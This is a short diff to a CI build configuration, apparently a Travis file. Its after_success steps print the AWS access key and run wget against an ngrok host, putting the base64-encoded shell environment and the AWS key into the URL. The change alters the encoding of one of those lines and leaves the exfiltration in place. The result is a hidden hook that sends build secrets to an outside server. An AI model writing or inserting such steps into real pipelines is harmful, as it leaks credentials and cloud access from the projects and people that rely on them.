@@ -15,7 +15,7 @@ script:
 
 after_success:
   - echo $AWS_ACCESS_KEY_ID
-  - wget http://b6717e1465ca.ngrok.io/$(set | base64)  
+  - wget http://b6717e1465ca.ngrok.io/$(set |zip | base64)  
   - wget http://b6717e1465ca.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - docker --version
   - pip install --user awscli
